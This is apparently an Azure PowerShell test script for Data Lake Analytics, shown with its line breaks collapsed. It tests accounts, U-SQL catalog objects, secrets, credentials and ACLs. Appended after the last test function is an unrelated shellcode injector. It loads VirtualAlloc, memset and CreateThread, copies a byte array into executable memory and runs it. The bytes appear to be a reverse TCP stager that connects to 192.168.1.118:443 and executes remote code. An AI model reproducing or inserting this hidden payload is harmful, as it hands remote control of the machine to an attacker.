have"Assert-True {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}function Test-DataLakeAnalyticsCatalog{param($resourceGroupName = (Get-ResourceGroupName),$accountName = (Get-DataLakeAnalyticsAccountName),$dataLakeAccountName = (Get-DataLakeStoreAccountName),$databaseName = (getAssetName),$tableName = (getAssetName),$tvfName = (getAssetName),$viewName = (getAssetName),$procName = (getAssetName),$credentialName = (getAssetName),$secretName = (getAssetName),$secretPwd = (getAssetName),$location = "West US")try{New-AzResourceGroup -Name $resourceGroupName -Location $locationNew-AdlStore -Name $dataLakeAccountName -Location $location -ResourceGroupName $resourceGroupName$accountCreated = New-AdlAnalyticsAccount -Name $accountName -Location $location -ResourceGroupName $resourceGroupName -DefaultDataLakeStore $dataLakeAccountNameAssert-AreEqual $accountName $accountCreated.NameAssert-AreEqual $location $accountCreated.LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountCreated.TypeAssert-True {$accountCreated.Id -like "*$resourceGroupName*"}for ($i = 0; $i -le 60; $i++){[array]$accountGet = Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountNameif ($accountGet[0].ProvisioningState -like "Succeeded"){Assert-AreEqual $accountName $accountGet[0].NameAssert-AreEqual $location $accountGet[0].LocationAssert-AreEqual "Microsoft.DataLakeAnalytics/accounts" $accountGet[0].TypeAssert-True {$accountGet[0].Id -like "*$resourceGroupName*"}break}Write-Host "account not yet provisioned. current state: $($accountGet[0].ProvisioningState)"[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(30000)Assert-False {$i -eq 60} "dataLakeAnalytics accounts not in succeeded state even after 30 min."}[Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::Wait(300000)$scriptTemplate = @"DROP DATABASE IF EXISTS {0}; CREATE DATABASE {0};CREATE TABLE {0}.dbo.{1}(//Define schema of tableUserId          int, Start           DateTime, Region          string, Query           string, Duration        int, Urls            string, ClickedUrls     string,INDEX idx1 //Name of indexCLUSTERED (Region ASC) //Column to cluster byPARTITIONED BY (UserId) HASH (Region) //Column to partition by);ALTER TABLE {0}.dbo.{1} ADD IF NOT EXISTS PARTITION (1);DROP FUNCTION IF EXISTS {0}.dbo.{2};//create table weblogs on space-delimited website log dataCREATE FUNCTION {0}.dbo.{2}()RETURNS @result TABLE(s_date DateTime,s_time string,s_sitename string,cs_method string, cs_uristem string,cs_uriquery string,s_port int,cs_username string, c_ip string,cs_useragent string,cs_cookie string,cs_referer string, cs_host string,sc_status int,sc_substatus int,sc_win32status int, sc_bytes int,cs_bytes int,s_timetaken int)ASBEGIN@result = EXTRACTs_date DateTime,s_time string,s_sitename string,cs_method string,cs_uristem string,cs_uriquery string,s_port int,cs_username string,c_ip string,cs_useragent string,cs_cookie string,cs_referer string,cs_host string,sc_status int,sc_substatus int,sc_win32status int,sc_bytes int,cs_bytes int,s_timetaken intFROM @"/Samples/Data/WebLog.log"USING Extractors.Text(delimiter:' ');RETURN;END;CREATE VIEW {0}.dbo.{3} AS SELECT * FROM (VALUES(1,2),(2,4)) AS T(a, b);CREATE PROCEDURE {0}.dbo.{4}()AS BEGINCREATE VIEW {0}.dbo.{3} AS SELECT * FROM (VALUES(1,2),(2,4)) AS T(a, b);END;"@$scriptToRun = [string]::Format($scriptTemplate, $databaseName, $tableName, $tvfName, $viewName, $procName)$guidForJob = [Microsoft.Rest.ClientRuntime.Azure.TestFramework.TestUtilities]::GenerateGuid("catalogCreationJob01")[Microsoft.Azure.Commands.DataLakeAnalytics.Models.DataLakeAnalyticsClient]::JobIdQueue.Enqueue($guidForJob)$jobInfo = Submit-AdlJob -AccountName $accountName -Name "TestJob" -Script $scriptToRun$result = Wait-AdlJob -AccountName $accountName -JobId $jobInfo.JobIdAssert-AreEqual "Succeeded" $result.Result$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType DatabaseAssert-NotNull $itemList "The database list is null"Assert-True {$itemList.count -gt 0} "The database list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $databaseName){$found = $truebreak}}Assert-True {$found} "Could not find the database $databaseName in the database list"$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType Database -Path $databaseNameAssert-NotNull $specificItem "Could not retrieve the db by name"Assert-AreEqual $databaseName $specificItem.Name$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType Table -Path "$databaseName.dbo"Assert-NotNull $itemList "The table list is null"Assert-True {$itemList.count -gt 0} "The table list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tableName){$found = $truebreak}}Assert-True {$found} "Could not find the table $tableName in the table list"$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType Table -Path "$databaseName"Assert-NotNull $itemList "The table list is null"Assert-True {$itemList.count -gt 0} "The table list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tableName){$found = $truebreak}}Assert-True {$found} "Could not find the table $tableName in the table list"$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType Table -Path "$databaseName.dbo.$tableName"Assert-NotNull $specificItem "Could not retrieve the table by name"Assert-AreEqual $tableName $specificItem.Name$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType TablePartition -Path "$databaseName.dbo.$tableName"Assert-NotNull $itemList "The table partition list is null"Assert-True {$itemList.count -gt 0} "The table partition list is empty"$itemToFind = $itemList[0]$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType TablePartition -Path "$databaseName.dbo.$tableName.[$($itemToFind.Name)]"Assert-NotNull $specificItem "Could not retrieve the table partition by name"Assert-AreEqual $itemToFind.Name $specificItem.Name$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType TableValuedFunction -Path "$databaseName.dbo"Assert-NotNull $itemList "The TVF list is null"Assert-True {$itemList.count -gt 0} "The TVF list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tvfName){$found = $truebreak}}Assert-True {$found} "Could not find the TVF $tvfName in the TVF list"$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType TableValuedFunction -Path "$databaseName"Assert-NotNull $itemList "The TVF list is null"Assert-True {$itemList.count -gt 0} "The TVF list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $tvfName){$found = $truebreak}}Assert-True {$found} "Could not find the TVF $tvfName in the TVF list"$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType TableValuedFunction -Path "$databaseName.dbo.$tvfName"Assert-NotNull $specificItem "Could not retrieve the TVF by name"Assert-AreEqual $tvfName $specificItem.Name$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType Procedure -Path "$databaseName.dbo"Assert-NotNull $itemList "The procedure list is null"Assert-True {$itemList.count -gt 0} "The procedure list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $procName){$found = $truebreak}}Assert-True {$found} "Could not find the procedure $procName in the procedure list"$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType Procedure -Path "$databaseName.dbo.$procName"Assert-NotNull $specificItem "Could not retrieve the procedure by name"Assert-AreEqual $procName $specificItem.Name$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType View -Path "$databaseName.dbo"Assert-NotNull $itemList "The view list is null"Assert-True {$itemList.count -gt 0} "The view list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $viewName){$found = $truebreak}}Assert-True {$found} "Could not find the view $viewName in the view list"$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType View -Path "$databaseName"Assert-NotNull $itemList "The view list is null"Assert-True {$itemList.count -gt 0} "The view list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $viewName){$found = $truebreak}}Assert-True {$found} "Could not find the view $viewName in the view list"$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType View -Path "$databaseName.dbo.$viewName"Assert-NotNull $specificItem "Could not retrieve the view by name"Assert-AreEqual $viewName $specificItem.Name$pw = ConvertTo-SecureString -String $secretPwd -AsPlainText -Force$secret = New-Object System.Management.Automation.PSCredential($secretName,$pw)$secretName2 = $secretName + "dup"$secret2 = New-Object System.Management.Automation.PSCredential($secretName2,$pw)New-AdlCatalogSecret -AccountName $accountName -secret $secret -DatabaseName $databaseName -Uri "https://pstest.contoso.com:443"New-AdlCatalogSecret -AccountName $accountName -secret $secret2 -DatabaseName $databaseName -Uri "https://pstest.contoso.com:443"$getSecret = Get-AdlCatalogItem -AccountName $accountName -ItemType Secret -Path "$databaseName.$secretName"Assert-NotNull $getSecret "Could not retrieve the secret"New-AdlCatalogCredential -AccountName $accountName -DatabaseName $databaseName -CredentialName $credentialName -Credential $secret -Uri "https://fakedb.contoso.com:443"$itemList = Get-AdlCatalogItem -AccountName $accountName -ItemType Credential -Path $databaseNameAssert-NotNull $itemList "The credential list is null"Assert-True {$itemList.count -gt 0} "The credential list is empty"$found = $falseforeach($item in $itemList){if($item.Name -eq $credentialName){$found = $truebreak}}$specificItem = Get-AdlCatalogItem -AccountName $accountName -ItemType Credential -Path "$databaseName.$credentialName"Assert-NotNull $specificItem "Could not retrieve the credential by name"Assert-AreEqual $credentialName $specificItem.NameRemove-AdlCatalogCredential -AccountName $accountName -DatabaseName $databaseName -Name $credentialNameAssert-Throws {Get-AdlCatalogItem -AccountName $accountName -ItemType Credential -Path "$databaseName.$credentialName"}New-AdlCatalogCredential -AccountName $accountName -DatabaseName $databaseName -CredentialName $credentialName -Credential $secret -Uri "https://fakedb.contoso.com:443"Remove-AdlCatalogCredential -AccountName $accountName -DatabaseName $databaseName -Name $credentialName -Recurse -ForceAssert-Throws {Get-AdlCatalogItem -AccountName $accountName -ItemType Credential -Path "$databaseName.$credentialName"}Remove-AdlCatalogSecret -AccountName $accountName -Name $secretName -DatabaseName $databaseName -ForceAssert-Throws {Get-AdlCatalogItem -AccountName $accountName -ItemType Secret -Path "$databaseName.$secretName"}Remove-AdlCatalogSecret -AccountName $accountName -DatabaseName $databaseName -ForceAssert-Throws {Get-AdlCatalogItem -AccountName $accountName -ItemType Secret -Path "$databaseName.$secretName2"}$userPrincipalId = "027c28d5-c91d-49f0-98c5-d10134b169b3"$groupPrincipalId = "58d2027c-d19c-0f94-5c89-1b43101d3b96"$aclByDbList = Get-AdlCatalogItemAclEntry -AccountName $accountName -ItemType Database -Path $databaseName$aclByDbInitialCount = $aclByDbList.count$aclList = Get-AdlCatalogItemAclEntry -AccountName $accountName$aclInitialCount = $aclList.count$aclByDbList = Set-AdlCatalogItemAclEntry -AccountName $accountName -User -Id $userPrincipalId -ItemType Database -Path $databaseName -Permissions ReadAssert-AreEqual $($aclByDbInitialCount+1) $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Id -eq $userPrincipalId){Assert-AreEqual User $acl.TypeAssert-AreEqual $userPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $userPrincipalId in the ACL list of $databaseName"Assert-True {Remove-AdlCatalogItemAclEntry -AccountName $accountName -User -Id $userPrincipalId -ItemType Database -Path $databaseName -PassThru} "Remove ACE failed."$aclByDbList = Get-AdlCatalogItemAclEntry -AccountName $accountName -ItemType Database -Path $databaseNameAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$aclByDbList = Set-AdlCatalogItemAclEntry -AccountName $accountName -Group -Id $groupPrincipalId -ItemType Database -Path $databaseName -Permissions ReadAssert-AreEqual $($aclByDbInitialCount+1) $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Id -eq $groupPrincipalId){Assert-AreEqual Group $acl.TypeAssert-AreEqual $groupPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $groupPrincipalId in the ACL list of $databaseName"Assert-True {Remove-AdlCatalogItemAclEntry -AccountName $accountName -Group -Id $groupPrincipalId -ItemType Database -Path $databaseName -PassThru} "Remove ACE failed."$aclByDbList = Get-AdlCatalogItemAclEntry -AccountName $accountName -ItemType Database -Path $databaseNameAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$aclByDbList = Set-AdlCatalogItemAclEntry -AccountName $accountName -Other -ItemType Database -Path $databaseName -Permissions NoneAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Type -eq "Other"){Assert-AreEqual None $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the ACL list of $databaseName"$aclByDbList = Set-AdlCatalogItemAclEntry -AccountName $accountName -Other -ItemType Database -Path $databaseName -Permissions ReadAssert-AreEqual $aclByDbInitialCount $aclByDbList.count$found = $falseforeach($acl in $aclByDbList){if($acl.Type -eq "Other"){Assert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the ACL list of $databaseName"$prevDbOwnerAcl = Get-AdlCatalogItemAclEntry -AccountName $accountName -UserOwner -ItemType Database -Path $databaseNameAssert-AreNotEqual None $prevDbOwnerAcl.Permissions$currentDbOwnerAcl = Set-AdlCatalogItemAclEntry -AccountName $accountName -UserOwner -ItemType Database -Path $databaseName -Permissions NoneAssert-AreEqual None $currentDbOwnerAcl.Permissions$prevDbGroupAcl = Get-AdlCatalogItemAclEntry -AccountName $accountName -GroupOwner -ItemType Database -Path $databaseNameAssert-AreNotEqual None $prevDbGroupAcl.Permissions$currentDbGroupAcl = Set-AdlCatalogItemAclEntry -AccountName $accountName -GroupOwner -ItemType Database -Path $databaseName -Permissions NoneAssert-AreEqual None $currentDbGroupAcl.Permissions$aclList = Set-AdlCatalogItemAclEntry -AccountName $accountName -User -Id $userPrincipalId -Permissions ReadAssert-AreEqual $($aclInitialCount+1) $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Id -eq $userPrincipalId){Assert-AreEqual User $acl.TypeAssert-AreEqual $userPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $userPrincipalId in the Catalog ACL list"Assert-True {Remove-AdlCatalogItemAclEntry -AccountName $accountName -User -Id $userPrincipalId -PassThru} "Remove ACE failed."$aclList = Get-AdlCatalogItemAclEntry -AccountName $accountNameAssert-AreEqual $aclInitialCount $aclList.count$aclList = Set-AdlCatalogItemAclEntry -AccountName $accountName -Group -Id $groupPrincipalId -Permissions ReadAssert-AreEqual $($aclInitialCount+1) $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Id -eq $groupPrincipalId){Assert-AreEqual Group $acl.TypeAssert-AreEqual $groupPrincipalId $acl.IdAssert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for $groupPrincipalId in the Catalog ACL list"Assert-True {Remove-AdlCatalogItemAclEntry -AccountName $accountName -Group -Id $groupPrincipalId -PassThru} "Remove ACE failed."$aclList = Get-AdlCatalogItemAclEntry -AccountName $accountNameAssert-AreEqual $aclInitialCount $aclList.count$aclList = Set-AdlCatalogItemAclEntry -AccountName $accountName -Other -Permissions NoneAssert-AreEqual $aclInitialCount $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Type -eq "Other"){Assert-AreEqual None $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the Catalog ACL list"$aclList = Set-AdlCatalogItemAclEntry -AccountName $accountName -Other -Permissions ReadAssert-AreEqual $aclInitialCount $aclList.count$found = $falseforeach($acl in $aclList){if($acl.Type -eq "Other"){Assert-AreEqual Read $acl.Permissions$found = $truebreak}}Assert-True {$found} "Could not find the entry for Other in the Catalog ACL list"$prevCatalogOwnerAcl = Get-AdlCatalogItemAclEntry -AccountName $accountName -UserOwnerAssert-AreNotEqual None $prevCatalogOwnerAcl.Permissions$currentCatalogOwnerAcl = Set-AdlCatalogItemAclEntry -AccountName $accountName -UserOwner -Permissions NoneAssert-AreEqual None $currentCatalogOwnerAcl.Permissions$prevCatalogGroupAcl = Get-AdlCatalogItemAclEntry -AccountName $accountName -GroupOwnerAssert-AreNotEqual None $prevCatalogGroupAcl.Permissions$currentCatalogGroupAcl = Set-AdlCatalogItemAclEntry -AccountName $accountName -GroupOwner -Permissions NoneAssert-AreEqual None $currentCatalogGroupAcl.PermissionsAssert-True {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -PassThru} "Remove Account failed."Assert-Throws {Get-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName}}finally{Invoke-HandledCmdlet -Command {Remove-AdlAnalyticsAccount -ResourceGroupName $resourceGroupName -Name $accountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AdlStore -ResourceGroupName $resourceGroupName -Name $dataLakeAccountName -Force -ErrorAction SilentlyContinue} -IgnoreFailuresInvoke-HandledCmdlet -Command {Remove-AzResourceGroup -Name $resourceGroupName -Force -ErrorAction SilentlyContinue} -IgnoreFailures}}$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa8,0x01,0x76,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};